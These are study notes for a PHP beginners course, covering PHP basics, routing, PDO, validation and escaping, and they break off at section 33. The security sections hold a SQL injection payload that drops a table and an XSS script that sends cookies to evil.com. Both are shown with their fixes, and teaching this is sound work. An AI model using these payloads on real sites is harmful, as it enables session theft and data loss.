# 📚 PHP For Beginners — Complete Study Notes
> Based on the Laracasts course by Jeffrey Way
> YouTube: https://www.youtube.com/watch?v=fw5ObX8P6as

---

## Table of Contents

1. [How to Choose a Programming Language](#1-how-to-choose-a-programming-language)
2. [Tools of the Trade](#2-tools-of-the-trade)
3. [Your First PHP Tag](#3-your-first-php-tag)
4. [Variables](#4-variables)
5. [Conditionals and Booleans](#5-conditionals-and-booleans)
6. [Arrays](#6-arrays)
7. [Associative Arrays](#7-associative-arrays)
8. [Functions and Filters](#8-functions-and-filters)
9. [Lambda Functions](#9-lambda-functions)
10. [Separate Logic From the Template](#10-separate-logic-from-the-template)
11. [Page Links](#11-page-links)
12. [PHP Partials](#12-php-partials)
13. [Superglobals and Current Page Styling](#13-superglobals-and-current-page-styling)
14. [Make a PHP Router](#14-make-a-php-router)
15. [Create a MySQL Database](#15-create-a-mysql-database)
16. [PDO First Steps](#16-pdo-first-steps)
17. [Extract a PHP Database Class](#17-extract-a-php-database-class)
18. [Environments and Configuration Flexibility](#18-environments-and-configuration-flexibility)
19. [SQL Injection Vulnerabilities Explained](#19-sql-injection-vulnerabilities-explained)
20. [Database Tables and Indexes](#20-database-tables-and-indexes)
21. [Render the Notes and Note Pages](#21-render-the-notes-and-note-pages)
22. [Introduction to Authorization](#22-introduction-to-authorization)
23. [Programming is Rewriting](#23-programming-is-rewriting)
24. [Intro to Forms and Request Methods](#24-intro-to-forms-and-request-methods)
25. [Always Escape Untrusted Input](#25-always-escape-untrusted-input)
26. [Intro to Form Validations](#26-intro-to-form-validations)
27. [Extract a Simple Validator Class](#27-extract-a-simple-validator-class)
28. [Resourceful Naming Conventions](#28-resourceful-naming-conventions)
29. [PHP Autoloading and Extractions](#29-php-autoloading-and-extractions)
30. [Namespacing: What, Why, How?](#30-namespacing-what-why-how)
31. [Handle Multiple Request Methods From a Controller](#31-handle-multiple-request-methods-from-a-controller)
32. [Build a Better Router](#32-build-a-better-router)
33. [One Request, One Controller](#33-one-request-one-controller)
34. [Make Your First Service Container](#34-make-your-first-service-container)
35. [Updating With PATCH Requests](#35-updating-with-patch-requests)
36. [PHP Sessions 101](#36-php-sessions-101)
37. [Register a New User](#37-register-a-new-user)
38. [Introduction to Middleware](#38-introduction-to-middleware)
39. [Manage Passwords Like This Forever](#39-manage-passwords-like-this-forever)
40. [Log In and Log Out](#40-log-in-and-log-out)
41. [Extract a Form Validation Object](#41-extract-a-form-validation-object)
42. [Extract an Authenticator Class](#42-extract-an-authenticator-class)
43. [The PRG Pattern and Session Flashing](#43-the-prg-pattern-and-session-flashing)
44. [Flash Old Form Data to the Session](#44-flash-old-form-data-to-the-session)
45. [Automatically Redirect Back Upon Failed Validations](#45-automatically-redirect-back-upon-failed-validations)
46. [Composer and Free Autoloading](#46-composer-and-free-autoloading)
47. [Install Two Composer Packages](#47-install-two-composer-packages)
48. [Testing Approaches, Terms, and Considerations](#48-testing-approaches-terms-and-considerations)

---

## 1. How to Choose a Programming Language

**The core idea:** Don't overthink it. The best language is the one that gets you to your goal.

PHP is a great first language for web development because:
- It runs on almost every web host in the world
- It powers ~80% of websites (WordPress, Facebook started in PHP)
- You see results instantly in the browser
- The feedback loop is very short — write code, refresh, see output

**Key mindset:** Languages are tools. A carpenter doesn't debate which hammer brand is best — they pick one and build things. Pick PHP, learn it deeply, then other languages become easier.

---

## 2. Tools of the Trade

**What you need and why:**

| Tool | What it is | Why you need it |
|------|-----------|-----------------|
| **VS Code** | Code editor | Where you write PHP, HTML, CSS |
| **Laragon** | Local server environment | Runs Apache (web server) + MySQL (database) on your computer |
| **phpMyAdmin** | Database GUI | Visual tool to see/edit your database tables |
| **Browser** | Chrome/Firefox/Edge | Where you test your app |

**How Laragon works:**
- It creates a local web server at `http://localhost`
- Every folder you put in `C:\laragon\www\` becomes a website
- `C:\laragon\www\myapp\` → accessible at `http://myapp.test`
- You don't need to pay for hosting while developing

**VS Code extensions to install:**
- PHP Intelephense — autocomplete, error highlighting
- PHP Debug — step-through debugging

---

## 3. Your First PHP Tag

**PHP lives inside HTML.** You open it with `<?php` and close with `?>`.

```php
<!DOCTYPE html>
<html>
<body>

    <!-- This is just HTML -->
    <h1>Hello</h1>

    <!-- This is PHP inside HTML -->
    <?php echo "World"; ?>

</body>
</html>
```

**Key rules:**
- PHP files use the `.php` extension
- The server processes PHP → sends plain HTML to the browser
- The browser never sees `<?php` — it only gets the result
- `echo` outputs text to the page
- Every PHP statement ends with `;`
- The short tag `<?=` is shorthand for `<?php echo`

```php
<!-- These two lines do the same thing -->
<?php echo "Hello"; ?>
<?= "Hello" ?>
```

**What the browser sees** (the PHP is gone, only HTML remains):
```html
<h1>Hello</h1>
World
```

---

## 4. Variables

**A variable is a named container that holds a value.**

In PHP, all variables start with `$`.

```php
<?php
$name = "Ahmed";
$age = 25;
$price = 9.99;
$isLoggedIn = true;

echo $name;       // Ahmed
echo $age;        // 25
echo $price;      // 9.99
?>
```

**Variable types:**

| Type | Example | Description |
|------|---------|-------------|
| String | `"Hello"` | Text |
| Integer | `42` | Whole number |
| Float | `3.14` | Decimal number |
| Boolean | `true` / `false` | Yes or no |
| Null | `null` | No value |

**String quotes — important difference:**

```php
$name = "Ahmed";

echo "Hello $name";   // Hello Ahmed  ← double quotes evaluate variables
echo 'Hello $name';   // Hello $name  ← single quotes are literal, no substitution
```

**String concatenation** (joining strings):

```php
$first = "Ahmed";
$last  = "Ali";

echo $first . " " . $last;   // Ahmed Ali  ← the dot joins strings
```

---

## 5. Conditionals and Booleans

**Conditionals let your program make decisions.**

```php
$age = 20;

if ($age >= 18) {
    echo "You are an adult.";
} else {
    echo "You are a minor.";
}
```

**Comparison operators:**

| Operator | Meaning | Example |
|----------|---------|---------|
| `==` | Equal (value only) | `5 == "5"` → true |
| `===` | Identical (value + type) | `5 === "5"` → false |
| `!=` | Not equal | `5 != 3` → true |
| `>` | Greater than | `10 > 5` → true |
| `<` | Less than | `3 < 8` → true |
| `>=` | Greater than or equal | `5 >= 5` → true |

**Always prefer `===` over `==`** — it's safer because it checks the type too.

**Logical operators:**

```php
// AND — both must be true
if ($age > 18 && $hasID == true) {
    echo "Welcome in!";
}

// OR — at least one must be true
if ($isAdmin || $isModerator) {
    echo "Access granted.";
}

// NOT — flips true to false
if (! $isLoggedIn) {
    echo "Please log in.";
}
```

**Ternary operator** — shorthand if/else in one line:

```php
// Long way
if ($isLoggedIn) {
    $label = "Log Out";
} else {
    $label = "Log In";
}

// Short way (ternary)
$label = $isLoggedIn ? "Log Out" : "Log In";
```

---

## 6. Arrays

**An array stores multiple values in one variable.**

```php
// Indexed array — items accessed by number position (starting at 0)
$fruits = ["apple", "banana", "mango"];

echo $fruits[0];   // apple
echo $fruits[1];   // banana
echo $fruits[2];   // mango
```

**Looping through an array with `foreach`:**

```php
$fruits = ["apple", "banana", "mango"];

foreach ($fruits as $fruit) {
    echo $fruit . "<br>";
}
// Output:
// apple
// banana
// mango
```

**Useful array functions:**

```php
$numbers = [3, 1, 4, 1, 5, 9];

count($numbers);           // 6 — how many items
array_push($numbers, 7);   // adds 7 to the end
sort($numbers);            // sorts ascending
in_array(4, $numbers);     // true — checks if value exists

// array_filter — keep only items that pass a test
$evens = array_filter($numbers, fn($n) => $n % 2 === 0);

// array_map — transform every item
$doubled = array_map(fn($n) => $n * 2, $numbers);
```

---

## 7. Associative Arrays

**An associative array uses named keys instead of numbers.**
This is the most common data structure in PHP — database rows come back as associative arrays.

```php
// Instead of $user[0], $user[1]... you use names
$user = [
    'name'  => 'Ahmed',
    'email' => 'ahmed@example.com',
    'age'   => 25
];

echo $user['name'];   // Ahmed
echo $user['email'];  // ahmed@example.com
```

**Array of associative arrays** — this is what database results look like:

```php
$notes = [
    ['id' => 1, 'body' => 'Buy groceries'],
    ['id' => 2, 'body' => 'Call the bank'],
    ['id' => 3, 'body' => 'Read a book'],
];

foreach ($notes as $note) {
    echo $note['body'] . "<br>";
}
```

**`array_column`** — pluck one field from every row:

```php
$bodies = array_column($notes, 'body');
// ['Buy groceries', 'Call the bank', 'Read a book']
```

---

## 8. Functions and Filters

**A function is a reusable block of code with a name.**

```php
// Define the function
function greet(string $name): string
{
    return "Hello, $name!";
}

// Call the function
echo greet("Ahmed");   // Hello, Ahmed!
echo greet("Sara");    // Hello, Sara!
```

**Parameters vs Arguments:**
- **Parameter** = the variable in the function definition (`$name`)
- **Argument** = the actual value you pass when calling it (`"Ahmed"`)

**Type hints** (PHP 7+) — declare what type a parameter must be:

```php
function add(int $a, int $b): int
{
    return $a + $b;
}
```

**Default parameter values:**

```php
function greet(string $name = "stranger"): string
{
    return "Hello, $name!";
}

echo greet();          // Hello, stranger!
echo greet("Ahmed");   // Hello, Ahmed!
```

**Using built-in array functions with callbacks:**

```php
$notes = [
    ['id' => 1, 'body' => 'Buy groceries', 'user_id' => 1],
    ['id' => 2, 'body' => 'Call the bank', 'user_id' => 2],
    ['id' => 3, 'body' => 'Read a book',   'user_id' => 1],
];

// array_filter: keep only notes belonging to user 1
$myNotes = array_filter($notes, function($note) {
    return $note['user_id'] === 1;
});
```

---

## 9. Lambda Functions

**A lambda (anonymous function) is a function with no name.**
You store it in a variable or pass it directly to another function.

```php
// Normal named function
function double(int $n): int {
    return $n * 2;
}

// Lambda stored in a variable
$double = function(int $n): int {
    return $n * 2;
};

echo $double(5);   // 10
```

**Arrow function syntax** (PHP 7.4+) — even shorter:

```php
$double = fn($n) => $n * 2;

echo $double(5);   // 10
```

**Where lambdas are used most — as callbacks:**

```php
$numbers = [1, 2, 3, 4, 5];

// Pass an arrow function directly into array_map
$doubled = array_map(fn($n) => $n * 2, $numbers);
// [2, 4, 6, 8, 10]

// Pass an arrow function into array_filter
$evens = array_filter($numbers, fn($n) => $n % 2 === 0);
// [2, 4]
```

**Why this matters:** Laravel uses lambdas everywhere — route callbacks, middleware, event listeners. Understanding this makes Laravel feel natural.

---

## 10. Separate Logic From the Template

**The golden rule: PHP logic should not live inside your HTML.**

**Bad — mixed together (hard to read and maintain):**

```php
<!DOCTYPE html>
<html>
<body>
<?php
$pdo = new PDO(...);
$stmt = $pdo->prepare('SELECT * FROM notes');
$stmt->execute();
$notes = $stmt->fetchAll();
?>
<ul>
    <?php foreach ($notes as $note): ?>
        <li><?= $note['body'] ?></li>
    <?php endforeach; ?>
</ul>
</body>
</html>
```

**Good — logic in one file, template in another:**

`index.php` (logic file):
```php
<?php
// Do all data work here
$notes = getNotes();  // some function that queries the DB

// Then load the view, passing data to it
require 'index.view.php';
```

`index.view.php` (template file):
```php
<!DOCTYPE html>
<html>
<body>
<ul>
    <?php foreach ($notes as $note): ?>
        <li><?= $note['body'] ?></li>
    <?php endforeach; ?>
</ul>
</body>
</html>
```

**Why?** The designer can work on the view without touching the logic. The developer can work on the logic without touching the HTML. This is the beginning of MVC.

**Alternative `foreach` syntax in templates** (cleaner inside HTML):

```php
<!-- Use : and endforeach instead of { } -->
<?php foreach ($notes as $note): ?>
    <li><?= $note['body'] ?></li>
<?php endforeach; ?>
```

---

## 11. Page Links

**How multi-page apps work before routing:**

The naive approach is one PHP file per page:
```
about.php
contact.php
notes.php
```

Links between pages:
```html
<a href="/about.php">About</a>
<a href="/contact.php">Contact</a>
```

**Problems with this approach:**
- URLs expose implementation details (`/about.php` — ugly)
- You can't have clean URLs like `/about`
- Hard to add logic that runs on every page (like auth checks)
- No central place to manage all your pages

This is exactly why a Router is needed — which we build later.

---

## 12. PHP Partials

**A partial is a reusable chunk of HTML saved in its own file.**

Without partials — you repeat the `<head>` and `<nav>` in every view file. Change the nav once → update 10 files.

With partials — change the nav once → updates everywhere.

`views/partials/head.php`:
```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MyApp</title>
    <link rel="stylesheet" href="/styles.css">
</head>
<body>
```

`views/partials/nav.php`:
```php
<nav>
    <a href="/">Home</a>
    <a href="/notes">Notes</a>
</nav>
```

`views/partials/footer.php`:
```php
    <footer>© 2024 MyApp</footer>
</body>
</html>
```

Using them in a view:
```php
<?php require 'partials/head.php'; ?>
<?php require 'partials/nav.php'; ?>

<main>
    <h1>Welcome!</h1>
</main>

<?php require 'partials/footer.php'; ?>
```

**`require` vs `include`:**
- `require` → if the file is missing, crash with a fatal error (use this for critical files)
- `include` → if the file is missing, just show a warning and continue

---

## 13. Superglobals and Current Page Styling

**Superglobals are built-in PHP variables available everywhere.**

The most important ones:

| Superglobal | Contains |
|-------------|----------|
| `$_GET` | Data from the URL query string |
| `$_POST` | Data from a form submission |
| `$_SERVER` | Server info (current URL, method, IP, etc.) |
| `$_SESSION` | Data stored across pages for the current user |
| `$_COOKIE` | Data stored in the browser |

**Highlight the current page in navigation:**

```php
// $_SERVER['REQUEST_URI'] gives you the current URL path
// e.g. "/notes" or "/about"

$currentUri = $_SERVER['REQUEST_URI'];
```

In `nav.php`:
```php
<nav>
    <a href="/"
       class="<?= $currentUri === '/' ? 'active' : '' ?>">
        Home
    </a>
    <a href="/notes"
       class="<?= $currentUri === '/notes' ? 'active' : '' ?>">
        Notes
    </a>
</nav>
```

```css
nav a.active {
    font-weight: bold;
    color: black;
}
```

---

## 14. Make a PHP Router

**The router is the traffic controller of your app.**

Every request goes through one file (`public/index.php`), and the router decides what to do based on the URL.

**How routing works:**

```
User visits /notes
    → public/index.php runs
    → Router checks: does /notes match any registered route?
    → Yes: load Http/controllers/notes/index.php
    → That file runs the logic and shows the view
```

**Simple router implementation:**

```php
<?php

class Router
{
    protected array $routes = [];

    public function get(string $uri, string $controller): void
    {
        $this->routes[] = [
            'uri'        => $uri,
            'controller' => $controller,
            'method'     => 'get'
        ];
    }

    public function resolve(string $uri, string $method): void
    {
        // Remove query string: /notes?id=1 → /notes
        $uri = parse_url($uri)['path'];

        foreach ($this->routes as $route) {
            if ($route['uri'] === $uri && $route['method'] === $method) {
                require $route['controller'];
                return;
            }
        }

        // No match found
        http_response_code(404);
        require '404.php';
    }
}
```

**Register routes in `routes.php`:**
```php
$router = new Router();
$router->get('/', 'controllers/index.php');
$router->get('/notes', 'controllers/notes/index.php');
return $router;
```

**`.htaccess`** — tells Apache to send ALL requests to `public/index.php`:
```apache
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^ index.php [L]
```

Without this file, Apache would try to find actual files matching the URL.

---

## 15. Create a MySQL Database

**MySQL is a relational database — data is stored in tables like spreadsheets.**

**Core SQL commands you must know:**

```sql
-- Create a database
CREATE DATABASE myapp CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

-- Use it
USE myapp;

-- Create a table
CREATE TABLE notes (
    id      INT AUTO_INCREMENT PRIMARY KEY,
    body    TEXT NOT NULL,
    user_id INT NOT NULL
);

-- Insert data
INSERT INTO notes (body, user_id) VALUES ('Buy groceries', 1);

-- Read data
SELECT * FROM notes;
SELECT * FROM notes WHERE user_id = 1;
SELECT * FROM notes WHERE id = 3;

-- Update data
UPDATE notes SET body = 'Buy milk' WHERE id = 1;

-- Delete data
DELETE FROM notes WHERE id = 1;
```

**Common column types:**

| Type | Use for |
|------|---------|
| `INT` | Whole numbers, IDs |
| `VARCHAR(255)` | Short text (names, emails) |
| `TEXT` | Long text (posts, notes) |
| `BOOLEAN` | True/false values |
| `TIMESTAMP` | Date and time |

**PRIMARY KEY** = unique identifier for each row. Always have one.
**AUTO_INCREMENT** = MySQL automatically assigns the next number.

---

## 16. PDO First Steps

**PDO (PHP Data Objects) is PHP's built-in way to talk to databases.**

Never build SQL strings with variables directly — that's a security hole. PDO with prepared statements is the safe way.

**Connecting to MySQL with PDO:**

```php
<?php

$dsn = "mysql:host=127.0.0.1;port=3306;dbname=myapp;charset=utf8mb4";

$pdo = new PDO($dsn, 'root', '', [
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
]);
```

**DSN** = Data Source Name — connection string telling PDO which database to connect to.

**Running a query:**

```php
// Prepare the query (PHP sends it to MySQL in advance)
$statement = $pdo->prepare('SELECT * FROM notes');

// Execute it (MySQL runs it)
$statement->execute();

// Fetch results
$notes = $statement->fetchAll();   // all rows as array
$note  = $statement->fetch();      // single row
```

**Fetch modes:**

```php
PDO::FETCH_ASSOC   // ['id' => 1, 'body' => 'Buy groceries']  ← use this
PDO::FETCH_OBJ     // $note->body  ← object style
PDO::FETCH_BOTH    // both index and name  ← don't use
```

---

## 17. Extract a PHP Database Class

**Don't scatter PDO code everywhere. Wrap it in a class.**

```php
<?php

class Database
{
    public $connection;
    private $statement;

    public function __construct(array $config)
    {
        $dsn = "mysql:host={$config['host']};dbname={$config['dbname']};charset=utf8mb4";

        $this->connection = new PDO($dsn, $config['username'], $config['password'], [
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
        ]);
    }

    public function query(string $sql, array $params = []): static
    {
        $this->statement = $this->connection->prepare($sql);
        $this->statement->execute($params);
        return $this;
    }

    public function findAll(): array
    {
        return $this->statement->fetchAll();
    }

    public function find(): array|false
    {
        return $this->statement->fetch();
    }
}
```

**Usage:**

```php
$db = new Database([
    'host'     => '127.0.0.1',
    'dbname'   => 'myapp',
    'username' => 'root',
    'password' => ''
]);

$notes = $db->query('SELECT * FROM notes')->findAll();
```

**Method chaining** — `query()` returns `$this` (the object itself), so you can chain `.findAll()` right after. This is a very common PHP/Laravel pattern.

---

## 18. Environments and Configuration Flexibility

**Never hardcode credentials. Use a config file.**

`config.php`:
```php
<?php

return [
    'database' => [
        'host'     => '127.0.0.1',
        'port'     => 3306,
        'dbname'   => 'myapp',
        'charset'  => 'utf8mb4',
        'username' => 'root',
        'password' => ''
    ]
];
```

Using it:
```php
$config = require 'config.php';
$db = new Database($config['database']);
```

**Why a config file?**
- Local config has `password => ''`
- Production server config has `password => 'xK9#mQ2!'`
- You swap the config file — the rest of the code doesn't change
- Add `config.php` to `.gitignore` so passwords never go to GitHub

`.gitignore`:
```
config.php
.env
vendor/
```

In real projects (including Laravel), these values live in a `.env` file:
```
DB_HOST=127.0.0.1
DB_DATABASE=myapp
DB_USERNAME=root
DB_PASSWORD=
```

---

## 19. SQL Injection Vulnerabilities Explained

**One of the most important security topics in web development.**

**What is SQL injection?**

If you build SQL with string concatenation using user input:

```php
// DANGEROUS — never do this
$id = $_GET['id'];   // user types: 1 OR 1=1

$sql = "SELECT * FROM notes WHERE id = $id";
// This becomes: SELECT * FROM notes WHERE id = 1 OR 1=1
// 1=1 is always true → returns ALL notes from ALL users!
```

A malicious user could type:
```
1; DROP TABLE notes; --
```
Which becomes:
```sql
SELECT * FROM notes WHERE id = 1; DROP TABLE notes; --
```
This deletes your entire notes table.

**The fix: Prepared Statements with named parameters**

```php
// SAFE — always do this
$id = $_GET['id'];

$notes = $db->query(
    'SELECT * FROM notes WHERE id = :id',
    ['id' => $id]
)->findAll();
```

PDO sends the SQL structure and the data separately. MySQL treats `:id` as pure data — no matter what the user types, it can never become part of the SQL command.

**The rule: Never put variables directly into SQL strings. Always use `:placeholders`.**

---

## 20. Database Tables and Indexes

**Indexes make database queries faster.**

Without an index, MySQL reads every row to find matches (a "full table scan"). With an index, it jumps directly to the right rows.

```sql
-- Add an index on user_id because we query by it constantly
-- "SELECT * FROM notes WHERE user_id = ?"
CREATE INDEX notes_user_id_index ON notes(user_id);

-- Foreign key — enforces relationship between tables
-- A note's user_id must reference an existing user
ALTER TABLE notes
ADD FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE;
```

**`ON DELETE CASCADE`** = if a user is deleted, all their notes are automatically deleted too.

**When to add an index:**
- On any column you filter by (`WHERE user_id = ?`)
- On any column you join on
- On any column you sort by (`ORDER BY created_at`)
- Foreign key columns always get indexed

---

## 21. Render the Notes and Note Pages

**Building the notes list and single note view.**

`Http/controllers/notes/index.php`:
```php
<?php

$db = resolve('Core\Database');

$notes = $db->query(
    'SELECT * FROM notes WHERE user_id = :user_id',
    ['user_id' => 1]
)->findAll();

view('notes/index.view.php', ['notes' => $notes]);
```

`Http/controllers/notes/show.php`:
```php
<?php

$db = resolve('Core\Database');

// Get the note by ID from the URL: /notes/show?id=1
$note = $db->query(
    'SELECT * FROM notes WHERE id = :id',
    ['id' => $_GET['id']]
)->findOrFail();   // 404 if not found

view('notes/show.view.php', ['note' => $note]);
```

`views/notes/index.view.php`:
```php
<?php require base_path('views/partials/head.php'); ?>

<ul>
    <?php foreach ($notes as $note): ?>
        <li>
            <a href="/notes/show?id=<?= $note['id'] ?>">
                <?= htmlspecialchars($note['body']) ?>
            </a>
        </li>
    <?php endforeach; ?>
</ul>

<?php require base_path('views/partials/footer.php'); ?>
```

---

## 22. Introduction to Authorization

**Authentication = who are you? Authorization = what are you allowed to do?**

Basic authorization check — a user should only see their own notes:

```php
$note = $db->query(
    'SELECT * FROM notes WHERE id = :id',
    ['id' => $_GET['id']]
)->findOrFail();

// Authorization check — does this note belong to the logged-in user?
if ($note['user_id'] !== $_SESSION['user']['id']) {
    abort(403);   // 403 = Forbidden
}
```

**HTTP status codes to know:**

| Code | Meaning | When to use |
|------|---------|-------------|
| 200 | OK | Everything is fine |
| 301 | Moved Permanently | Redirect forever |
| 302 | Found (redirect) | Temporary redirect |
| 403 | Forbidden | Logged in but not allowed |
| 404 | Not Found | Page/resource doesn't exist |
| 422 | Unprocessable Entity | Validation failed |
| 500 | Server Error | Something crashed in your code |

---

## 23. Programming is Rewriting

**The lesson:** First make it work. Then make it clean. Then make it fast.

No professional writes perfect code on the first try. The process is:
1. Write working but messy code
2. Identify repeating patterns
3. Extract them into functions, classes, helpers
4. Repeat

This is called **refactoring** — improving the structure of code without changing what it does.

Signs you need to refactor:
- You're copy-pasting the same code in multiple places
- A function is getting too long (more than ~20 lines)
- A file is doing too many different things
- You struggle to explain what a piece of code does

The framework we're building in this course IS the refactoring of messy PHP files into clean, organized classes.

---

## 24. Intro to Forms and Request Methods

**HTML forms send data to your server. HTTP methods tell the server what kind of action to take.**

**The 4 HTTP methods and their purpose:**

| Method | Purpose | Example |
|--------|---------|---------|
| `GET` | Retrieve data | View notes list |
| `POST` | Create new data | Submit a new note |
| `PATCH` | Update existing data | Edit a note |
| `DELETE` | Remove data | Delete a note |

**A basic HTML form:**

```html
<form method="POST" action="/notes">
    <textarea name="body" placeholder="Your note..."></textarea>
    <button type="submit">Save</button>
</form>
```

- `method="POST"` → sends data in the request body (hidden from URL)
- `action="/notes"` → sends the form to this URL
- `name="body"` → accessible in PHP as `$_POST['body']`

**Handling the POST in PHP:**

```php
<?php
// This runs when the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $body = $_POST['body'];
    // save to database...
}
```

**GET vs POST — key difference:**

```
GET  /notes?search=groceries   ← data visible in URL, bookmarkable
POST /notes                    ← data hidden in request body, not bookmarkable
```

Use POST for anything that changes data (create, update, delete).
Use GET for anything that only reads data.

---

## 25. Always Escape Untrusted Input

**Never output user-provided data directly into HTML.**

**The attack (XSS — Cross Site Scripting):**

A malicious user submits a note with this body:
```
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

If you output it raw:
```php
echo $note['body'];   // DANGEROUS
```

The browser runs the script, stealing the user's cookies (which contain their session).

**The fix — always escape output:**

```php
echo htmlspecialchars($note['body'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
```

`htmlspecialchars()` converts dangerous characters:

| Character | Becomes |
|-----------|---------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#039;` |
| `&` | `&amp;` |

The browser displays `<script>` as text instead of executing it.

**Create a helper so you don't type the whole thing:**

```php
function e(string $value): string {
    return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
```

Usage in views:
```php
<?= e($note['body']) ?>
```

**Rule:** Every piece of user-generated content in your views must be wrapped in `e()`.

---

## 26. Intro to Form Validations

**Before saving data, verify it meets your requirements.**

```php
$errors = [];

// Required field check
if (empty($_POST['body'])) {
    $errors['body'] = 'A note body is required.';
}

// Length check
if (strlen($_POST['body']) > 1000) {
    $errors['body'] = 'Note must be under 1000 characters.';
}

// If there are errors, don't save — show them to the user
if (!empty($errors)) {
    // pass errors to the view
    view('notes/create.view.php', ['errors' => $errors]);
    exit();
}

// No errors — safe to save
$db->query('INSERT INTO notes (body) VALUES (:body)', [
    'body' => $_POST['body']
]);
```

**Display errors in the view:**

```php
<?php if (isset($errors['body'])): ?>
    <p style="color: red;"><?= e($errors['body']) ?></p>
<?php endif; ?>

<form method="POST" action="/notes">
    <textarea name="body"><?= e($_POST['body'] ?? '') ?></textarea>
    <button>Save</button>
</form>
```

Note: `$_POST['body'] ?? ''` — the `??` is the **null coalescing operator**. It means "use `$_POST['body']` if it exists, otherwise use empty string". This repopulates the form with what the user typed.

---

## 27. Extract a Simple Validator Class

**Move validation logic into its own class so any controller can use it.**

```php
<?php

class Validator
{
    // Check a string field is not empty
    public static function string(
        string $value,
        int $min = 1,
        int $max = INF
    ): bool {
        $value = trim($value);   // remove leading/trailing spaces

        return strlen($value) >= $min && strlen($value) <= $max;
    }

    // Check a value is a valid email address
    public static function email(string $value): bool
    {
        return filter_var($value, FILTER_VALIDATE_EMAIL) !== false;
    }
}
```

**Using it:**

```php
$errors = [];

if (! Validator::string($_POST['body'], 1, 1000)) {
    $errors['body'] = 'Body must be between 1 and 1000 characters.';
}

if (! Validator::email($_POST['email'])) {
    $errors['email'] = 'Please provide a valid email.';
}
```

**`static::` vs `$this->`** — `static` means you don't need to create an object first. `Validator::string(...)` works directly without `new Validator()`.

---

## 28. Resourceful Naming Conventions

**Consistent naming makes a codebase predictable and professional.**

The REST convention maps HTTP actions to controller file names:

| URL | Method | Controller File | Action |
|-----|--------|-----------------|--------|
| `/notes` | GET | `notes/index.php` | Show all notes |
| `/notes/create` | GET | `notes/create.php` | Show create form |
| `/notes` | POST | `notes/store.php` | Save new note |
| `/notes/show` | GET | `notes/show.php` | Show one note |
| `/notes/edit` | GET | `notes/edit.php` | Show edit form |
| `/notes` | PATCH | `notes/update.php` | Save edited note |
| `/notes` | DELETE | `notes/destroy.php` | Delete note |

**Why follow conventions?**
- Any developer can join your project and instantly understand the structure
- This is exactly how Laravel's resourceful controllers work
- Avoids naming arguments ("should it be `save.php` or `store.php`?")

---

## 29. PHP Autoloading and Extractions

**Stop writing `require` for every class. Let PHP find them automatically.**

**Manual (tedious):**
```php
require 'Core/Router.php';
require 'Core/Database.php';
require 'Core/Container.php';
require 'Core/App.php';
// ... for every class you create
```

**Autoloading (automatic):**

```php
// Tell PHP: "when you see a class, figure out its file path automatically"
spl_autoload_register(function ($class) {
    // 'Core\Database' → 'Core/Database.php'
    $path = str_replace('\\', DIRECTORY_SEPARATOR, $class);
    require BASE_PATH . $path . '.php';
});
```

Now when PHP sees `new \Core\Database()` anywhere in your code, it automatically loads `Core/Database.php`. No manual requires needed.

**File organization rule:** The file path must match the class namespace.
- Class `Core\Database` → file `Core/Database.php`
- Class `Http\Controllers\NoteController` → file `Http/Controllers/NoteController.php`

---

## 30. Namespacing: What, Why, How?

**Namespaces prevent class name collisions.**

Imagine two packages both have a class called `Router`. Without namespaces, PHP doesn't know which one you mean.

```php
// Without namespaces — collision!
class Router { ... }   // your router
class Router { ... }   // some library's router — PHP crashes!
```

**With namespaces — no collision:**

```php
// Your router — Core/Router.php
namespace Core;

class Router { ... }

// Library's router
namespace SomeLibrary;

class Router { ... }
```

**Using namespaced classes:**

```php
// Use the full path
$router = new \Core\Router();

// Or import with 'use' at the top of the file
use Core\Router;
$router = new Router();
```

**Namespace rules:**
- Declared at the very top of the file: `namespace Core;`
- Must match the folder structure
- `Core\Database` lives in the `Core/` folder
- Use `use` statements to import classes you need

---

## 31. Handle Multiple Request Methods From a Controller

**A single URL can respond differently based on the HTTP method.**

Example: `/notes` should:
- `GET /notes` → show the notes list
- `POST /notes` → save a new note

You can handle both in one file:

```php
<?php
// In a controller that handles both GET and POST

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Show the notes list
    $notes = $db->query('SELECT * FROM notes')->findAll();
    view('notes/index.view.php', ['notes' => $notes]);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Save a new note
    $db->query('INSERT INTO notes (body) VALUES (:body)', [
        'body' => $_POST['body']
    ]);
    redirect('/notes');
}
```

Later in the course this gets split into separate files (one controller per action) — which is cleaner.

---

## 32. Build a Better Router

**Improve the Router to support all HTTP methods and method spoofing.**

HTML forms only support `GET` and `POST`. To send `PATCH` or `DELETE`, we use a hidden field:

```html
<form method="POST" action="/notes">
    <!-- Tell the router to treat this as PATCH -->
    <input type="hidden" name="_method" value="PATCH">
    <textarea name="body">...</textarea>
    <button>Update</button>
</form>
```

The Router checks for this:

```php
public function resolve(string $uri, string $method): void
{
    $uri = parse_url($uri)['path'];

    // Check for method spoofing
    if (isset($_POST['_method'])) {
        $method = strtolower($_POST['_method']);
    }

    foreach ($this->routes as $route) {
        if ($route['uri'] === $uri && $route['method'] === $method) {
            require base_path("Http/controllers/{$route['controller']}");
            return;
        }
    }

    abort(404);
}
```

Now you can register PATCH and DELETE routes:

```php
$router->patch('/notes', 'notes/update.php');
$router->delete('/notes', 'notes/destroy.php');
```

---

## 33. One Request, One Controller

**Each route should map to exactly one small, focused controller file.**

Instead of one big file handling GET and POST:

```
Http/controllers/notes/
├── index.php     ← GET  /notes        (list)
├── create.php    ← GET  /notes/create (show form)
├── store.php     ← POST /notes        (save new)
├── show.php      ← GET  /notes/show   (single note)
├── edit.php      ← GET  /notes/edit   (show edit form)
├── update.php    ← PATCH /notes       (save edit)
└── destroy.php   ← DELETE /notes      (delete)
```

